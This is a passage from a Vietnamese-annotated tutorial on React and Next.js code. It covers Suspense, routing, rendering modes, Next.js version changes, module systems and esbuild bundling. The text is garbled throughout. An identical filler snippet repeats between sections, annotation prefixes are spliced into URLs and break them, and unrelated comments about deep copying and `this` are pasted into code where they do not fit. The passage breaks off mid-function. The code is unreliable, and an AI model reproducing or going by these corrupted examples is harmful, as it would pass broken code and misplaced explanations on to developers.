      <UserList /> {/* Suspends while loading */}
    </Suspense>
  );
}

 // Chú giải: Libraries hỗ trợ: React Query, SWR, Relay

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: Server Component (.server.jsx)
async function UserProfile({ userId }) {
  const user = await db.users.findById(userId); // Chú giải: Direct DB access!
  return <div>{user.name}</div>;
}

 // Chú giải: Client Component (.client.jsx)
'use client';
function Counter() {
  const [count, setCount] = useState(0);
  return <button onClick={() => setCount(count + 1)}>{count}</button>;
}

 // Chú giải: Benefits:
// - Zero bundle size (server components không ship JS)
 // Chú giải: - Direct backend access (DB, filesystem)
 // Chú giải: - Automatic code splitting

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: useTransition: Mark updates as non-urgent
function SearchBox() {
  const [query, setQuery] = useState('');
  const [isPending, startTransition] = useTransition();

  const handleChange = (e) => {
    setQuery(e.target.value); // Chú giải: Urgent: update input

    startTransition(() => {
      setSearchResults(e.target.value); // Chú giải: Non-urgent: can interrupt
    });
  };

  return (
    <>
      <input value={query} onChange={handleChange} />
      {isPending && <Spinner />}
      <Results />
    </>
  );
}

 // Chú giải: useDeferredValue: Defer value updates
function App() {
  const [text, setText] = useState('');
  const deferredText = useDeferredValue(text); // Chú giải: Lags behind

  return (
    <>
      <input value={text} onChange={e => setText(e.target.value)} />
      <SlowList text={deferredText} /> {/* Uses old value while busy */}
    </>
  );
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: Server-side: Generate HTML
const html = renderToString(<App />);
 // Chú giải: Send HTML to client → User sees content immediately

 // Chú giải: Client-side: Hydrate (attach event listeners)
hydrateRoot(document.getElementById('root'), <App />);

 // Chú giải: React 18: Selective Hydration
<Suspense fallback={<Spinner />}>
  <Comments /> {/* Hydrate sau khi ready */}
</Suspense>
// User có thể interact với page khác ngay lập tức

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
import { BrowserRouter, Routes, Route, Link, useParams, useNavigate } from 'react-router-dom';

function App() {
  return (
    <BrowserRouter>
      <nav>
        <Link to="/">Home</Link>
        <Link to="/about">About</Link>
        <Link to="/users/123">User 123</Link>
      </nav>

      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
        <Route path="/users/:id" element={<User />} />
        <Route path="*" element={<NotFound />} /> {/* 404 */}
      </Routes>
    </BrowserRouter>
  );
}

function User() {
  const { id } = useParams(); // Chú giải: Get URL params
  const navigate = useNavigate(); // Chú giải: Programmatic navigation

  return (
    <>
      <h1>User {id}</h1>
      <button onClick={() => navigate('/about')}>Go to About</button>
    </>
  );
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: Avoid extra DOM nodes
function List() {
  return (
    <>
      <li>Item 1</li>
      <li>Item 2</li>
    </> // Chú giải: No wrapper div in DOM
  );
}

 // Chú giải: With key (trong loops)
{items.map(item => (
  <React.Fragment key={item.id}>
    <dt>{item.term}</dt>
    <dd>{item.description}</dd>
  </React.Fragment>
))}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
import { startTransition } from 'react';

 // Chú giải: Mark state updates as non-urgent
function TabContainer() {
  const [tab, setTab] = useState('home');

  function selectTab(nextTab) {
    startTransition(() => {
      setTab(nextTab); // Chú giải: Low priority
    });
  }

 // Chú giải: Input stays responsive even if TabPanel render is slow
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
const OtherComponent = lazy(() => import('./OtherComponent'));

function MyComponent() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <OtherComponent />
    </Suspense>
  );
}

 // Chú giải: Multiple lazy components
<Suspense fallback={<Spinner />}>
  <ComponentA />
  <ComponentB />
</Suspense>
 // Chú giải: Waits for BOTH before showing (avoid cascading spinners)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: 1. SSR - Server-Side Rendering (mỗi request)
 // Chú giải: ══════════════════════════════════════════════════════════
// Chạy trên server MỖI request → Fresh data, tốt cho SEO
export async function getServerSideProps(context) {
  const res = await fetch('https: // Chú giải: api.example.com/data');
  const data = await res.json();

  return {
    props: { data }, // Chú giải: Passed to page component
  };
}

function Page({ data }) {
  return <div>{data.title}</div>;
}

// ✅ Khi nào dùng: Data thay đổi thường xuyên, cần real-time
// ⚠️ Nhược điểm: Slower TTFB (Time To First Byte), server load cao

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: 2. SSG - Static Site Generation (build time)
 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: Generate HTML tại BUILD TIME → Serve static files (cực nhanh)
export async function getStaticProps() {
  const res = await fetch('https: // Chú giải: api.example.com/posts');
  const posts = await res.json();

  return {
    props: { posts },
    revalidate: 60, // ISR: Re-generate mỗi 60s nếu có request
  };
}

 // Chú giải: Dynamic routes với SSG
export async function getStaticPaths() {
  const res = await fetch('https: // Chú giải: api.example.com/posts');
  const posts = await res.json();

  const paths = posts.map(post => ({
    params: { id: post.id.toString() },
  }));

  return {
    paths, // Pre-render những paths này
    fallback: 'blocking', // Chú giải: 'blocking' | true | false
  };
}

// ✅ Khi nào dùng: Blog, docs, marketing pages (static content)
// ✅ Ưu điểm: Cực nhanh, CDN-friendly, tốt cho SEO

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: 3. ISR - Incremental Static Regeneration
 // Chú giải: ══════════════════════════════════════════════════════════
export async function getStaticProps() {
  const data = await fetchData();

  return {
    props: { data },
    revalidate: 10, // Chú giải: Re-generate page mỗi 10s (stale-while-revalidate)
  };
}

 // Chú giải: Flow:
 // Chú giải: 1. Request → Serve stale page (instant)
 // Chú giải: 2. Background: Re-generate new page
 // Chú giải: 3. Next request → Serve fresh page
 // Chú giải: ✅ Best of both worlds: Static speed + Fresh data

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: 4. CSR - Client-Side Rendering
 // Chú giải: ══════════════════════════════════════════════════════════
import useSWR from 'swr';

function Profile() {
  const { data, error } = useSWR('/api/user', fetcher);

  if (error) return <div>Failed to load</div>;
  if (!data) return <div>Loading...</div>;

  return <div>Hello {data.name}</div>;
}

// ✅ Khi nào dùng: Private pages, dashboards, user-specific data
// ⚠️ Nhược điểm: Không tốt cho SEO, slower initial load

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: pages/index.tsx → /
 // Chú giải: pages/about.tsx → /about
 // Chú giải: pages/blog/[slug].tsx → /blog/:slug (dynamic)
 // Chú giải: pages/blog/[...slug].tsx → /blog/* (catch-all)
 // Chú giải: pages/api/hello.ts → /api/hello (API route)

 // Chú giải: Dynamic route example
 // Chú giải: pages/posts/[id].tsx
import { useRouter } from 'next/router';

function Post() {
  const router = useRouter();
  const { id } = router.query; // Chú giải: Get dynamic param

  return <div>Post: {id}</div>;
}

 // Chú giải: Catch-all route: pages/docs/[...slug].tsx
 // Chú giải: Matches: /docs/a, /docs/a/b, /docs/a/b/c
function Docs() {
  const router = useRouter();
  const { slug } = router.query; // Chú giải: slug = ['a', 'b', 'c']

  return <div>Path: {slug?.join('/')}</div>;
}

 // Chú giải: Programmatic navigation
const router = useRouter();
router.push('/about'); // Chú giải: Client-side navigation
router.push({ pathname: '/post/[id]', query: { id: '1' } });
router.replace('/login'); // Chú giải: Replace history
router.back(); // Chú giải: Go back

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: pages/api/user.ts
import type { NextApiRequest, NextApiResponse } from 'next';

type Data = {
  name: string;
};

export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
 // Chú giải: Method-based routing
  if (req.method === 'POST') {
 // Chú giải: Handle POST
    const { name } = req.body;
    res.status(200).json({ name });
  } else {
 // Chú giải: Handle GET
    res.status(200).json({ name: 'John Doe' });
  }
}

 // Chú giải: Dynamic API route: pages/api/posts/[id].ts
export default function handler(req, res) {
  const { id } = req.query;
  res.status(200).json({ post: id });
}

 // Chú giải: ✅ Use cases: Backend logic, database queries, authentication

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
import Image from 'next/image';

 // Chú giải: Automatic optimization, lazy loading, responsive
function Avatar() {
  return (
    <Image
      src="/me.png"
      alt="Picture"
      width={500}
      height={500}
      priority // Chú giải: Load eagerly (above fold)
      placeholder="blur" // Chú giải: Blur placeholder while loading
      blurDataURL="data:image/..." // Chú giải: Custom blur
    />
  );
}

 // Chú giải: External images
<Image
  src="https: // Chú giải: example.com/photo.jpg"
  alt="Photo"
  width={800}
  height={600}
  loader={({ src, width, quality }) => {
    return `${src}?w=${width}&q=${quality || 75}`;
  }}
/>

 // Chú giải: ✅ Benefits:
 // Chú giải: - Auto WebP/AVIF conversion
 // Chú giải: - Lazy loading (viewport intersection)
 // Chú giải: - Responsive images (srcset)
 // Chú giải: - Prevent layout shift (width/height required)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: middleware.ts (root level)
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

// Chạy TRƯỚC request đến page/API
export function middleware(request: NextRequest) {
 // Chú giải: Authentication
  const token = request.cookies.get('token');

  if (!token && request.nextUrl.pathname.startsWith('/dashboard')) {
    return NextResponse.redirect(new URL('/login', request.url));
  }

 // Chú giải: A/B Testing
  const bucket = request.cookies.get('bucket') || Math.random() > 0.5 ? 'a' : 'b';
  const response = NextResponse.next();
  response.cookies.set('bucket', bucket);

  // Rewrite (thay đổi URL nội bộ)
  if (request.nextUrl.pathname === '/old-blog') {
    return NextResponse.rewrite(new URL('/blog', request.url));
  }

  return response;
}

 // Chú giải: Chỉ chạy cho specific paths
export const config = {
  matcher: ['/dashboard/:path*', '/api/:path*'],
};

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: app/layout.tsx - Root layout
export default function RootLayout({ children }) {
  return (
    <html>
      <body>{children}</body>
    </html>
  );
}

// app/page.tsx - Home page (Server Component mặc định)
async function getData() {
  const res = await fetch('https: // Chú giải: api.example.com/data');
  return res.json();
}

export default async function Page() {
  const data = await getData(); // Chú giải: Async component!
  return <div>{data.title}</div>;
}

 // Chú giải: app/dashboard/layout.tsx - Nested layout
export default function DashboardLayout({ children }) {
  return (
    <div>
      <Sidebar />
      {children}
    </div>
  );
}

 // Chú giải: Client component (when needed)
'use client'; // Chú giải: Directive

import { useState } from 'react';

export default function Counter() {
  const [count, setCount] = useState(0);
  return <button onClick={() => setCount(count + 1)}>{count}</button>;
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: Fetch with caching
async function getData() {
  const res = await fetch('https: // Chú giải: api.example.com/data', {
    cache: 'force-cache', // Chú giải: SSG-like (default)
  });
  return res.json();
}

 // Chú giải: Revalidate every 10s (ISR)
async function getData() {
  const res = await fetch('https: // Chú giải: api.example.com/data', {
    next: { revalidate: 10 },
  });
  return res.json();
}

 // Chú giải: No caching (SSR-like)
async function getData() {
  const res = await fetch('https: // Chú giải: api.example.com/data', {
    cache: 'no-store',
  });
  return res.json();
}

 // Chú giải: Parallel data fetching
export default async function Page() {
  const [user, posts] = await Promise.all([
    fetch('/api/user').then(r => r.json()),
    fetch('/api/posts').then(r => r.json()),
  ]);

  return <div>{user.name} - {posts.length} posts</div>;
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: pages/index.tsx (Pages Router)
import Head from 'next/head';

export default function Home() {
  return (
    <>
      <Head>
        <title>My Page Title</title>
        <meta name="description" content="Page description" />
        <meta property="og:title" content="OG Title" />
        <meta property="og:description" content="OG Description" />
        <meta property="og:image" content="https: // Chú giải: example.com/og.jpg" />
        <meta name="twitter:card" content="summary_large_image" />
        <link rel="canonical" href="https: // Chú giải: example.com" />
      </Head>
      <h1>Home</h1>
    </>
  );
}

 // Chú giải: app/page.tsx (App Router) - Metadata API
import type { Metadata } from 'next';

export const metadata: Metadata = {
  title: 'My Page Title',
  description: 'Page description',
  openGraph: {
    title: 'OG Title',
    description: 'OG Description',
    images: [{ url: 'https: // Chú giải: example.com/og.jpg' }],
  },
  twitter: {
    card: 'summary_large_image',
  },
};

 // Chú giải: Dynamic metadata
export async function generateMetadata({ params }): Promise<Metadata> {
  const product = await fetch(`/api/products/${params.id}`).then(r => r.json());

  return {
    title: product.name,
    description: product.description,
    openGraph: {
      images: [product.image],
    },
  };
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: 1. Sitemap Generation (pages/api/sitemap.xml.ts)
export default function Sitemap() {
 // Chú giải: Generate sitemap XML
}

 // Chú giải: 2. robots.txt (public/robots.txt)
 // Chú giải: User-agent: *
 // Chú giải: Allow: /
 // Chú giải: Sitemap: https://example.com/sitemap.xml

 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
<script
  type="application/ld+json"
  dangerouslySetInnerHTML={{
    __html: JSON.stringify({
      '@context': 'https: // Chú giải: schema.org',
      '@type': 'Article',
      headline: 'Article Title',
      author: { '@type': 'Person', name: 'Author' },
    }),
  }}
/>

 // Chú giải: 4. Image Alt Text
<Image src="/photo.jpg" alt="Descriptive alt text" width={500} height={500} />

 // Chú giải: 5. Semantic HTML
<article>
  <h1>Title</h1>
  <p>Content</p>
</article>

 // Chú giải: 6. Internal Linking
import Link from 'next/link';
<Link href="/about">About</Link> // Chú giải: Prefetch on hover

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: 1. Dynamic Imports (Code Splitting)
import dynamic from 'next/dynamic';

const DynamicComponent = dynamic(() => import('../components/Heavy'), {
  loading: () => <p>Loading...</p>,
  ssr: false, // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
});

 // Chú giải: 2. Font Optimization
import { Inter } from 'next/font/google';

const inter = Inter({ subsets: ['latin'] });

export default function App({ Component, pageProps }) {
  return (
    <main className={inter.className}>
      <Component {...pageProps} />
    </main>
  );
}

 // Chú giải: 3. Script Optimization
import Script from 'next/script';

<Script
  src="https: // Chú giải: analytics.com/script.js"
  strategy="lazyOnload" // Chú giải: afterInteractive | beforeInteractive | lazyOnload
/>

 // Chú giải: 4. Streaming (App Router)
import { Suspense } from 'react';

export default function Page() {
  return (
    <Suspense fallback={<Loading />}>
      <SlowComponent />
    </Suspense>
  );
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: 1. Turbopack (Beta) - Faster dev server
 // Chú giải: next.config.js
module.exports = {
  experimental: {
    turbo: {}, // Chú giải: Opt-in Turbopack (5000+ tests passing)
  },
};

 // Chú giải: 2. Server Actions (Stable)
 // Chú giải: app/actions.ts
'use server';

export async function createPost(formData: FormData) {
  const title = formData.get('title');
  await db.posts.create({ title });
  revalidatePath('/posts');
}

 // Chú giải: app/page.tsx
export default function Page() {
  return (
    <form action={createPost}>
      <input name="title" />
      <button type="submit">Create</button>
    </form>
  );
}

 // Chú giải: 3. Partial Prerendering (Preview) - Hybrid SSR + Static
 // Chú giải: Combines static shell + dynamic content
export const experimental_ppr = true; // Chú giải: Per-route

 // Chú giải: 4. Metadata Improvements
export const metadata = {
  metadataBase: new URL('https: // Chú giải: example.com'),
  alternates: {
    canonical: '/',
    languages: { 'en-US': '/en-US', 'vi-VN': '/vi-VN' },
  },
};

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: 1. React 19 Support
 // Chú giải: - React Compiler (automatic memoization)
 // Chú giải: - New hooks: useFormStatus, useOptimistic
 // Chú giải: - Server Components improvements

 // Chú giải: 2. Async Request APIs (Breaking Change)
 // Chú giải: Before (Next 14): Synchronous
import { cookies, headers } from 'next/headers';
const cookieStore = cookies();

 // Chú giải: After (Next 15): Async
const cookieStore = await cookies();
const headersList = await headers();

 // Chú giải: 3. Caching Behavior Changes
 // Chú giải: Next 14: fetch() cached by default
 // Chú giải: Next 15: fetch() NOT cached by default (opt-in caching)

 // Chú giải: Opt-in caching
fetch('https: // Chú giải: api.example.com', { cache: 'force-cache' });

 // Chú giải: 4. Turbopack Dev (Stable)
 // Chú giải: No longer experimental, default in development
 // Chú giải: next.config.js - Auto-enabled

 // Chú giải: 5. Hydration Error Improvements
 // Chú giải: Better error messages with source code context
 // Chú giải: Automatic suggestions for common issues

 // Chú giải: 6. Static Route Indicator
 // Chú giải: Dev overlay shows which routes are static/dynamic
 // Chú giải: <NextIndicator /> shows route type

 // Chú giải: 7. Form Submissions
import { useFormStatus } from 'react-dom';

function SubmitButton() {
  const { pending } = useFormStatus();
  return <button disabled={pending}>Submit</button>;
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: 1. Turbopack Build (Production)
 // Chú giải: Currently dev-only, production builds will use Turbopack
 // Chú giải: Faster builds, less memory usage

 // Chú giải: 2. Partial Prerendering (Stable)
 // Chú giải: pages/product/[id].tsx
export const experimental_ppr = true;

export default async function Product({ params }) {
 // Chú giải: Static shell renders immediately
  return (
    <div>
      <h1>Product {params.id}</h1>

      {/* Dynamic content loads after */}
      <Suspense fallback={<Skeleton />}>
        <ProductDetails id={params.id} />
      </Suspense>

      <Suspense fallback={<Skeleton />}>
        <Reviews id={params.id} />
      </Suspense>
    </div>
  );
}

 // Chú giải: 3. Enhanced React Compiler Integration
 // Chú giải: Auto-optimize components without manual memo/useCallback
function Component({ items }) {
 // Chú giải: Automatically optimized by React Compiler
  const filtered = items.filter(item => item.active);
  return <List items={filtered} />;
}

 // Chú giải: 4. Improved Streaming
 // Chú giải: Better support for streaming SSR
 // Chú giải: Selective hydration improvements

 // Chú giải: 5. Edge Runtime Enhancements
 // Chú giải: More Node.js APIs available in Edge Runtime
 // Chú giải: Better compatibility with existing packages

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: NEXT 14 → 15 (Breaking Changes)
 // Chú giải: ══════════════════════════════════════════════════════════

 // Chú giải: 1. Update async request APIs
 // Chú giải: Before (14)
import { cookies } from 'next/headers';
const cookieStore = cookies();

 // Chú giải: After (15)
const cookieStore = await cookies();

 // Chú giải: 2. Update caching behavior
 // Chú giải: Before (14) - cached by default
fetch('https: // Chú giải: api.example.com');

 // Chú giải: After (15) - opt-in caching
fetch('https: // Chú giải: api.example.com', { cache: 'force-cache' });

 // Chú giải: 3. Update next.config.js
 // Chú giải: Remove experimental turbo flag (now default)
module.exports = {
 // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
};

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: NEXT 15 → 16 (Expected Changes)
 // Chú giải: ══════════════════════════════════════════════════════════

 // Chú giải: 1. Enable PPR for production
export const experimental_ppr = true; // Chú giải: Becomes stable

 // Chú giải: 2. Remove manual optimizations (React Compiler handles)
 // Chú giải: Before (15)
const memoized = useMemo(() => compute(data), [data]);
const callback = useCallback(() => handleClick(), []);

 // Chú giải: After (16) - Compiler auto-optimizes
const memoized = compute(data); // Chú giải: Auto-memoized
const callback = () => handleClick(); // Chú giải: Auto-memoized

 // Chú giải: 3. Turbopack production builds
 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
{
  "scripts": {
    "build": "next build" // Chú giải: Uses Turbopack automatically
  }
}

```js
// Ví dụ rút gọn
const example = 42;
```

js
 // Chú giải: CJS file
  (async () => {
    const esmModule = await import('./esm-file.mjs');
  })();

```js
// Ví dụ rút gọn
const example = 42;
```

js
 // Chú giải: CJS
  module.exports = { foo: 1 };
 // Chú giải: ESM import
  import { foo } from 'cjs-module'; // ❌ Không work! (Node.js synthetic support)
  import cjs from 'cjs-module'; // Chú giải: ✅ cjs = { foo: 1 }
  const { foo } = cjs;

```js
// Ví dụ rút gọn
const example = 42;
```

js
 // Chú giải: CJS
  console.log(__dirname);
 // Chú giải: ESM
  import { fileURLToPath } from 'url';
  const __dirname = fileURLToPath(new URL('.', import.meta.url));

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ============================================
 // Chú giải: COMMONJS (Node.js Traditional)
 // Chú giải: ============================================

 // Chú giải: math.js - CommonJS Export
function add(a, b) {
  return a + b;
}

function subtract(a, b) {
  return a - b;
}

// Export toàn bộ object
module.exports = {
  add,
  subtract,
};

// Hoặc export individual
exports.add = add;
exports.subtract = subtract;

 // Chú giải: app.js - CommonJS Import
const math = require('./math'); // Chú giải: Synchronous loading
console.log(math.add(1, 2)); // Chú giải: 3

 // Chú giải: Destructuring import
const { add, subtract } = require('./math');
console.log(add(1, 2)); // Chú giải: 3

 // Chú giải: Dynamic import (runtime)
const moduleName = './math';
const math2 = require(moduleName); // Chú giải: ✅ Works - runtime evaluation

 // Chú giải: Conditional import
if (condition) {
  const math3 = require('./math'); // Chú giải: ✅ Works
}

 // Chú giải: ============================================
 // Chú giải: ES MODULES (Modern JavaScript)
 // Chú giải: ============================================

 // Chú giải: math.mjs - ESM Named Exports
export function add(a: number, b: number): number {
  return a + b;
}

export function subtract(a: number, b: number): number {
  return a - b;
}

 // Chú giải: Default export
export default function multiply(a: number, b: number): number {
  return a * b;
}

 // Chú giải: app.mjs - ESM Import
import multiply, { add, subtract } from './math.mjs'; // Chú giải: Async loading
console.log(add(1, 2)); // Chú giải: 3
console.log(multiply(3, 4)); // Chú giải: 12

 // Chú giải: Import all
import * as math from './math.mjs';
console.log(math.add(1, 2)); // Chú giải: 3

 // Chú giải: Dynamic import (async)
const modulePath = './math.mjs';
 // Chú giải: import modulePath; // ❌ Error - must be static string

 // Chú giải: Dynamic import with await
const { add: dynamicAdd } = await import('./math.mjs'); // Chú giải: ✅ Works

 // Chú giải: Conditional import
if (condition) {
  const { add } = await import('./math.mjs'); // Chú giải: ✅ Works with await
}

 // Chú giải: ============================================
 // Chú giải: BROWSER USAGE - Native ESM
 // Chú giải: ============================================

```js
// Ví dụ rút gọn
const example = 42;
```

html
<!-- index.html - Browser Native ESM -->
<!DOCTYPE html>
<html>
<head>
  <title>ESM in Browser</title>
</head>
<body>
  <!-- Traditional script (no modules) -->
  <script src="./legacy.js"></script>

  <!-- ESM - type="module" enables import/export -->
  <script type="module">
 // Chú giải: Import từ local file
    import { add } from './utils/math.js'; // Phải có .js extension
    console.log('1 + 2 =', add(1, 2));

 // Chú giải: Import từ CDN (ESM format)
    import confetti from 'https: // Chú giải: cdn.skypack.dev/canvas-confetti';
    confetti();

 // Chú giải: Dynamic import cho code splitting
    document.getElementById('btn')?.addEventListener('click', async () => {
 // Chú giải: Lazy load heavy module khi user click
      const { heavyFunction } = await import('./heavy-feature.js');
      heavyFunction();
    });

 // Chú giải: Import maps (Chrome 89+)
 // Chú giải: <script type="importmap">
 // Chú giải: {
 // Chú giải: "imports": {
 // Chú giải: "lodash": "https://cdn.skypack.dev/lodash",
 // Chú giải: "react": "https://cdn.skypack.dev/react"
 // Chú giải: }
 // Chú giải: }
 // Chú giải: </script>

 // Chú giải: Then import như package name
 // Chú giải: import _ from 'lodash';
  </script>

  <!-- Preload modules cho better performance -->
  <link rel="modulepreload" href="./utils/math.js">
  <link rel="modulepreload" href="./heavy-feature.js">
</body>
</html>

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ============================================
 // Chú giải: COMMONJS LOADING MECHANISM
 // Chú giải: ============================================
/**
 * Vietnamese Explanation:
 *
 * 1. SYNCHRONOUS LOADING (Đồng Bộ):
 *    - require() đọc file NGAY LẬP TỨC
 *    - Block execution cho đến khi file loaded
 *    - Cached sau lần đầu (module.exports object được cache)
 *
 * 2. RUNTIME EVALUATION:
 *    - Code trong module được execute ngay khi require()
 *    - Dynamic imports allowed (require với string variable)
 *    - Conditional requires allowed
 *
 * 3. CACHING:
 *    - Module chỉ execute MỘT LẦN
 *    - Các lần require() sau return cached exports
 *    - require.cache chứa tất cả loaded modules
 */

 // Chú giải: Example: CommonJS caching
 // Chú giải: a.js
console.log('Module A loaded'); // Chú giải: Chỉ log 1 lần
module.exports = { name: 'A' };

 // Chú giải: main.js
const a1 = require('./a'); // Chú giải: Log: "Module A loaded"
const a2 = require('./a'); // Không log gì (cached)
console.log(a1 === a2); // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.

 // Chú giải: ============================================
 // Chú giải: ESM LOADING MECHANISM
 // Chú giải: ============================================
/**
 * Vietnamese Explanation:
 *
 * 1. ASYNCHRONOUS LOADING (Bất Đồng Bộ):
 *    - import statements parsed trước khi execution
 *    - Browser fetch modules parallel, không block
 *    - Modules execute theo dependency order
 *
 * 2. STATIC ANALYSIS:
 *    - Import/export phải là static strings (không thể dùng variables)
 *    - Bundlers có thể analyze dependencies tại build time
 *    - Tree-shaking possible (remove unused exports)
 *
 * 3. MODULE GRAPH:
 *    - Browser xây dựng dependency graph
 *    - Fetch → Parse → Instantiate → Evaluate
 *    - Mỗi module chỉ evaluate MỘT LẦN
 *
 * 4. LIVE BINDINGS:
 *    - Imported values là REFERENCES, không phải copies
 *    - Changes trong export module reflect trong import
 */

 // Chú giải: Example: ESM live bindings
 // Chú giải: counter.mjs
export let count = 0;
export function increment() {
  count++;
}

 // Chú giải: main.mjs
import { count, increment } from './counter.mjs';
console.log(count); // Chú giải: 0
increment();
console.log(count); // Chú giải: 1 - live binding updated!

 // Chú giải: CommonJS would copy value:
 // Chú giải: const { count } = require('./counter.js');
 // Chú giải: increment();
 // Chú giải: console.log(count); // Still 0 - copied value

 // Chú giải: ============================================
 // Chú giải: BUNDLING với ESBuild (Ultra-Fast Bundler)
 // Chú giải: ============================================
/**
 * Vietnamese Explanation:
 *
 * ESBuild là extremely fast bundler viết bằng Go
 * - 10-100x nhanh hơn Webpack/Rollup
 * - Built-in TypeScript support
 * - Tree-shaking tự động
 * - Code splitting
 * - Minification
 */

 // Chú giải: esbuild.config.js
import * as esbuild from 'esbuild';

 // Chú giải: Basic build
await esbuild.build({
  entryPoints: ['src/index.ts'],
  bundle: true, // Chú giải: Bundle tất cả dependencies
  outfile: 'dist/bundle.js',
  minify: true, // Chú giải: Minify code
  sourcemap: true, // Chú giải: Generate source maps
  target: 'es2020', // Chú giải: Target environment
  format: 'esm', // Chú giải: Output format: 'esm' | 'cjs' | 'iife'
  platform: 'browser', // Chú giải: 'browser' | 'node' | 'neutral'

 // Chú giải: Tree-shaking configuration
  treeShaking: true,

  // External dependencies (không bundle)
  external: ['react', 'react-dom'],

 // Chú giải: Define global constants
  define: {
    'process.env.NODE_ENV': '"production"',
  },

 // Chú giải: Plugin system
  plugins: [],
});

 // Chú giải: Advanced: Code Splitting với multiple entry points
await esbuild.build({
  entryPoints: {
    home: 'src/pages/home.ts',
    about: 'src/pages/about.ts',
    contact: 'src/pages/contact.ts',
  },
  bundle: true,
  outdir: 'dist',
  splitting: true, // Chú giải: Enable code splitting
  format: 'esm', // Chú giải: Required for splitting
  chunkNames: 'chunks/[name]-[hash]',
});

// Transform single file (không bundle)
const result = await esbuild.transform(
  'const x: number = 1;',
  {
    loader: 'ts',
    target: 'es2020',
    minify: true,
  }
);
console.log(result.code); // Chú giải: "const x=1;"

 // Chú giải: Watch mode cho development
const ctx = await esbuild.context({
  entryPoints: ['src/index.ts'],
  bundle: true,
  outfile: 'dist/bundle.js',
  sourcemap: true,
});

await ctx.watch(); // Chú giải: Watch for file changes
await ctx.serve({ port: 3000 }); // Chú giải: Serve với dev server

 // Chú giải: ============================================
 // Chú giải: TREE-SHAKING với ESM
 // Chú giải: ============================================
/**
 * Vietnamese Explanation:
 *
 * Tree-shaking = Dead Code Elimination
 * - Bundler analyze import/export graph
 * - Remove unused exports từ final bundle
 * - CHỈ works với ESM (static analysis)
 * - CommonJS KHÔNG thể tree-shake (dynamic)
 */

// utils.ts - Library với nhiều functions
export function usedFunction() {
  console.log('Used');
}

export function unusedFunction() {
  console.log('Unused'); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
}

export function anotherUnused() {
  console.log('Also unused'); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
}

 // Chú giải: main.ts - Chỉ import 1 function
import { usedFunction } from './utils';
usedFunction();

 // Chú giải: After bundling với tree-shaking:
 // Chú giải: ✅ usedFunction included in bundle
 // Chú giải: ❌ unusedFunction removed (dead code)
 // Chú giải: ❌ anotherUnused removed (dead code)

 // Chú giải: Side-effects prevent tree-shaking
 // Chú giải: utils-with-side-effects.ts
console.log('This runs on import!'); // Chú giải: Side effect!

export function myFunction() {
  return 42;
}

 // Chú giải: Even if myFunction unused, file still included due to side-effect
 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
 // Chú giải: {
 // Chú giải: "sideEffects": false
 // Chú giải: }

 // Chú giải: Or specify which files have side-effects:
 // Chú giải: {
 // Chú giải: "sideEffects": ["*.css", "src/polyfills.ts"]
 // Chú giải: }

 // Chú giải: ============================================
 // Chú giải: CODE SPLITTING & LAZY LOADING
 // Chú giải: ============================================
/**
 * Vietnamese Explanation:
 *
 * Code Splitting = Tách code thành nhiều bundles
 * - Initial bundle: Core functionality
 * - Lazy chunks: Load on-demand
 * - Route-based: Load khi navigate to route
 * - Component-based: Load khi component rendered
 */

 // Chú giải: React example with lazy loading
import React, { lazy, Suspense } from 'react';

 // Chú giải: Lazy load component (code splitting automatic)
const HeavyComponent = lazy(() => import('./HeavyComponent'));

function App() {
  return (
